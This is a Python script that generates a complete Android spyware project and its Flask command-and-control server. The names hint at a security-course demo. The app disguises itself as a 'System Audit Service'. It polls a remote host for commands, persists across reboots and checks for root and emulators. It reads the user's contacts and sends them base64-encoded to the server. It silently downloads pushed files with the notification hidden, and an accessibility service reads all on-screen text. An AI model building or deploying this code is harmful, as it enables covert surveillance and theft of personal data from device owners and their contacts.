import os

FILES = {
    "app.py": """from flask import Flask, request, jsonify, render_template_string, send_from_directory
import os
import base64

app = Flask(__name__)
telemetry_logs = []
pending_command = "NO_OP"
current_payload = {
    "type": "document",
    "file_url": "https://cehdemo.onrender.com/download/secure_update.pdf",
    "message": "Confidential system notification payload."
}

ASSET_DIR = os.path.join(os.getcwd(), "static")
os.makedirs(ASSET_DIR, exist_ok=True)

@app.route('/')
def dashboard():
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>C2 Unified Operations Dashboard</title>
            <style>
                body { font-family: system-ui, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
                .container { max-width: 1000px; margin: auto; background: #1e293b; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
                h2 { color: #38bdf8; border-bottom: 2px solid #334155; padding-bottom: 10px; }
                .status { display: inline-block; padding: 6px 12px; background: #22c55e; color: #fff; border-radius: 4px; font-weight: bold; font-size: 14px; }
                .log-box { background: #0f172a; border: 1px solid #334155; padding: 15px; border-radius: 6px; height: 300px; overflow-y: auto; font-family: monospace; font-size: 13px; color: #a5f3fc; white-space: pre-wrap; word-break: break-all; }
                .btn { display: inline-block; margin-top: 10px; margin-right: 10px; padding: 10px 15px; background: #2563eb; color: white; text-decoration: none; border-radius: 4px; font-weight: bold; border: none; cursor: pointer; }
                .btn:hover { background: #1d4ed8; }
                .btn-danger { background: #dc2626; }
                .btn-danger:hover { background: #b91c1c; }
                .panel { display: flex; gap: 20px; margin-bottom: 20px; }
                .control-group { background: #0f172a; padding: 15px; border-radius: 6px; flex: 1; border: 1px solid #334155; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>C2 Operations Command Center</h2>
                <p>C2 Engine Status: <span class="status">LISTENING & ACTIVE</span></p>
                
                <div class="panel">
                    <div class="control-group">
                        <h3>Action Dispatcher</h3>
                        <form action="/set_command" method="POST">
                            <button type="submit" name="cmd" value="FULL_HARVEST" class="btn btn-danger">Trigger Telemetry Harvest</button>
                            <button type="submit" name="cmd" value="PUSH_PAYLOAD" class="btn">Push Asset (PDF/Img)</button>
                        </form>
                    </div>
                </div>

                <h3>Live Inbound Node Telemetry Stream</h3>
                <div class="log-box" id="logBox">Awaiting active beacon connection...</div>
            </div>
            <script>
                async function fetchLogs() {
                    try {
                        const res = await fetch('/logs');
                        const data = await res.json();
                        if (data.logs && data.logs.length > 0) {
                            document.getElementById('logBox').innerHTML = data.logs.join('<br><br>');
                        }
                    } catch(e) { console.error(e); }
                }
                setInterval(fetchLogs, 1500);
            </script>
        </body>
        </html>
    ''')

@app.route('/collect', methods=['POST'])
def receive_telemetry():
    data = request.get_json() or {}
    encoded_payload = data.get('payload', '')
    try:
        decoded_text = base64.b64decode(encoded_payload.encode('utf-8')).decode('utf-8')
    except Exception:
        decoded_text = "[Payload Decoding Failed]"

    log_entry = f"[{request.remote_addr}] Telemetry Report: {decoded_text} | Timestamp: {data.get('timestamp')}"
    telemetry_logs.append(log_entry)
    if len(telemetry_logs) > 60:
        telemetry_logs.pop(0)
    return jsonify({"status": "acknowledged"}), 200

@app.route('/command', methods=['GET'])
def get_command():
    global pending_command
    cmd = pending_command
    pending_command = "NO_OP"
    return jsonify({"command": cmd})

@app.route('/check_payload', methods=['GET'])
def check_payload():
    return jsonify(current_payload)

@app.route('/set_command', methods=['POST'])
def set_command():
    global pending_command
    pending_command = request.form.get('cmd', 'NO_OP')
    return '''<script>window.location.href="/";</script>'''

@app.route('/logs', methods=['GET'])
def get_logs():
    return jsonify({"logs": telemetry_logs})

@app.route('/download/<path:filename>', methods=['GET'])
def download_asset(filename):
    return send_from_directory(ASSET_DIR, filename, as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
""",

    "requirements.txt": """Flask==3.0.2
requests==2.31.0
""",

    # Gradle Project Configurations Added Below
    "build.gradle": """plugins {
    id 'com.android.application' version '8.2.0' apply false
    id 'org.jetbrains.kotlin.android' version '1.9.0' apply false
}
""",

    "settings.gradle": """pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}
rootProject.name = "securitylab"
include ':app'
""",

    "gradle/wrapper/gradle-wrapper.properties": """distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\\://services.gradle.org/distributions/gradle-8.4-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
""",

    "app/build.gradle": """plugins {
    id 'com.android.application'
    id 'org.jetbrains.kotlin.android'
}

android {
    namespace 'com.example.securitylab'
    compileSdk 34

    defaultConfig {
        applicationId "com.example.securitylab"
        minSdk 24
        targetSdk 34
        versionCode 1
        versionName "1.0"
        testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
    kotlinOptions {
        jvmTarget = '1.8'
    }
}

dependencies {
    implementation 'androidx.core:core-ktx:1.12.0'
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    implementation 'androidx.work:work-runtime-ktx:2.9.0'
}
""",

    "app/src/main/AndroidManifest.xml": """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.securitylab">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />

    <application
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="System Audit Service"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.AppCompat.Light.NoActionBar">
        
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service
            android:name=".service.AuditAccessibilityService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <receiver
            android:name=".receiver.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
    </application>
</manifest>
""",

    "app/src/main/res/xml/accessibility_service_config.xml": """<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault|flagRetrieveInteractiveWindows"
    android:canRetrieveWindowContent="true"
    android:notificationTimeout="100" />
""",

    "app/src/main/res/layout/activity_main.xml": """<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#0f172a"
    android:orientation="vertical"
    android:padding="20dp">

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="System Audit Client Node"
        android:textColor="#38bdf8"
        android:textSize="22sp"
        android:textStyle="bold"
        android:gravity="center"
        android:layout_marginBottom="24dp" />

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="WorkManager background periodic sync active. Polling C2 command interface."
        android:textColor="#94a3b8"
        android:textSize="14sp"
        android:layout_marginBottom="24dp" />

    <Button
        android:id="@+id/btnForceWork"
        android:layout_width="match_parent"
        android:layout_height="50dp"
        android:text="Force Immediate Node Sync"
        android:backgroundTint="#2563eb"
        android:textColor="#ffffff"
        android:layout_marginBottom="16dp" />

    <TextView
        android:id="@+id/tvStatus"
        android:layout_width="match_parent"
        android:layout_height="250dp"
        android:background="#1e293b"
        android:textColor="#a5f3fc"
        android:padding="12dp"
        android:text="Node operational..."
        android:textSize="12sp"
        android:fontFamily="monospace" />
</LinearLayout>
""",

    "app/src/main/java/com/example/securitylab/MainActivity.kt": """package com.example.securitylab

import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.example.securitylab.worker.StealthSyncWorker
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val tvStatus = findViewById<TextView>(R.id.tvStatus)

        val workRequest = PeriodicWorkRequestBuilder<StealthSyncWorker>(15, TimeUnit.MINUTES).build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "StealthSyncJob",
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )

        tvStatus.text = "WorkManager periodic sync registered successfully.\\nPolling loop armed."

        findViewById<Button>(R.id.btnForceWork).setOnClickListener {
            StealthSyncWorker.executeSyncNow(applicationContext)
            tvStatus.text = "Immediate synchronization cycle dispatched."
        }
    }
}
""",

    "app/src/main/java/com/example/securitylab/DataHarvester.kt": """package com.example.securitylab

import android.content.Context
import android.os.Build
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject

object DataHarvester {
    fun harvestDeviceInfo(context: Context): String {
        val contactsArray = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null, null
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < 20) {
                    contactsArray.put(JSONObject().put("name", it.getString(0) ?: "").put("number", it.getString(1) ?: ""))
                    count++
                }
            }
        } catch (e: Exception) {}

        return JSONObject().apply {
            put("device", Build.MODEL)
            put("sdk", Build.VERSION.SDK_INT)
            put("contacts_sample", contactsArray)
        }.toString()
    }
}
""",

    "app/src/main/java/com/example/securitylab/SecurityGuard.kt": """package com.example.securitylab

import android.os.Build
import java.io.File

object SecurityGuard {
    fun isEmulator(): Boolean {
        return Build.FINGERPRINT.startsWith("generic") ||
                Build.MODEL.contains("google_sdk") ||
                Build.HARDWARE.contains("goldfish") ||
                Build.HARDWARE.contains("ranchu") ||
                Build.TAGS.contains("test-keys")
    }

    fun checkRoot(): Boolean {
        val paths = arrayOf(
            "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su",
            "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su"
        )
        for (path in paths) {
            if (File(path).exists()) return true
        }
        return false
    }
}
""",

    "app/src/main/java/com/example/securitylab/TelemetryClient.kt": """package com.example.securitylab

import android.util.Base64
import android.util.Log
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

object TelemetryClient {
    private const val ENDPOINT_URL = "https://cehdemo.onrender.com/collect"

    fun sendEncryptedData(plainTextPayload: String) {
        Thread {
            var connection: HttpURLConnection? = null
            try {
                val encodedPayload = Base64.encodeToString(plainTextPayload.toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
                val url = URL(ENDPOINT_URL)
                connection = (url.openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    setRequestProperty("Content-Type", "application/json; charset=utf-8")
                    doOutput = true
                    connectTimeout = 10000
                    readTimeout = 10000
                }

                val envelope = JSONObject().apply {
                    put("payload", encodedPayload)
                    put("timestamp", System.currentTimeMillis())
                }.toString()

                connection.outputStream.use { os ->
                    os.write(envelope.toByteArray(Charsets.UTF_8))
                }
                connection.responseCode
            } catch (e: Exception) {
                Log.e("Telemetry", "Transmission failed", e)
            } finally {
                connection?.disconnect()
            }
        }.start()
    }
}
""",

    "app/src/main/java/com/example/securitylab/worker/StealthSyncWorker.kt": """package com.example.securitylab.worker

import android.app.DownloadManager
import android.content.Context
import android.net.Uri
import android.os.Environment
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.example.securitylab.DataHarvester
import com.example.securitylab.SecurityGuard
import com.example.securitylab.TelemetryClient
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class StealthSyncWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    override fun doWork(): Result {
        return try {
            val command = pollCommand()
            if (command != "NO_OP") {
                val payload = JSONObject().apply {
                    put("cmd_executed", command)
                    put("is_rooted", SecurityGuard.checkRoot())
                    put("is_emulator", SecurityGuard.isEmulator())
                    put("data", DataHarvester.harvestDeviceInfo(applicationContext))
                }.toString()

                TelemetryClient.sendEncryptedData(payload)

                if (command == "PUSH_PAYLOAD") {
                    fetchAndDownloadAsset(applicationContext)
                }
            }
            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }

    private fun pollCommand(): String {
        return try {
            val url = URL("https://cehdemo.onrender.com/command")
            val connection = (url.openConnection() as HttpURLConnection).apply {
                requestMethod = "GET"
                connectTimeout = 5000
            }
            if (connection.responseCode == 200) {
                val response = connection.inputStream.bufferedReader().use { it.readText() }
                JSONObject(response).optString("command", "NO_OP")
            } else "NO_OP"
        } catch (e: Exception) { "NO_OP" }
    }

    private fun fetchAndDownloadAsset(context: Context) {
        try {
            val url = URL("https://cehdemo.onrender.com/check_payload")
            val connection = (url.openConnection() as HttpURLConnection).apply { connectTimeout = 5000 }
            if (connection.responseCode == 200) {
                val response = connection.inputStream.bufferedReader().use { it.readText() }
                val json = JSONObject(response)
                val fileUrl = json.optString("file_url", "")
                
                if (fileUrl.isNotEmpty()) {
                    val request = DownloadManager.Request(Uri.parse(fileUrl)).apply {
                        setTitle("System Bulletin")
                        setDescription("Synchronizing secure asset...")
                        setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN)
                        setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "secure_document.pdf")
                    }
                    val manager = context.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
                    manager.enqueue(request)
                }
            }
        } catch (e: Exception) {}
    }

    companion object {
        fun executeSyncNow(context: Context) {
            Thread {
                try {
                    val payload = JSONObject().apply {
                        put("cmd_executed", "MANUAL_TRIGGER")
                        put("is_rooted", SecurityGuard.checkRoot())
                        put("is_emulator", SecurityGuard.isEmulator())
                        put("data", DataHarvester.harvestDeviceInfo(context))
                    }.toString()
                    TelemetryClient.sendEncryptedData(payload)
                } catch (e: Exception) {}
            }.start()
        }
    }
}
""",

    "app/src/main/java/com/example/securitylab/service/AuditAccessibilityService.kt": """package com.example.securitylab.service

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log

class AuditAccessibilityService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            rootInActiveWindow?.let {
                traverseNodes(it)
                it.recycle()
            }
        }
    }

    private fun traverseNodes(node: AccessibilityNodeInfo) {
        val text = node.text?.toString()
        if (!text.isNullOrBlank()) {
            Log.d("A11yAudit", "Detected Node Text: $text")
        }
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let {
                traverseNodes(it)
                it.recycle()
            }
        }
    }

    override fun onInterrupt() {}
}
""",

    "app/src/main/java/com/example/securitylab/receiver/BootReceiver.kt": """package com.example.securitylab.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.example.securitylab.worker.StealthSyncWorker
import java.util.concurrent.TimeUnit

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            val workRequest = PeriodicWorkRequestBuilder<StealthSyncWorker>(15, TimeUnit.MINUTES).build()
            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "StealthSyncJob",
                ExistingPeriodicWorkPolicy.KEEP,
                workRequest
            )
        }
    }
}
"""
}

def generate_project():
    base_dir = "securitylab"
    print(f"[-] Initializing generation inside directory: {base_dir}/")
    
    for filepath, content in FILES.items():
        full_path = os.path.join(base_dir, filepath)
        parent_dir = os.path.dirname(full_path)
        
        if parent_dir and not os.path.exists(parent_dir):
            os.makedirs(parent_dir, exist_ok=True)
            
        with open(full_path, "w", encoding="utf-8") as f:
            f.write(content.strip() + "\n")
        print(f"[+] Created: {full_path}")

    print("\n[✔] Project directory structure & Gradle configurations generated successfully!")

if __name__ == "__main__":
    generate_project()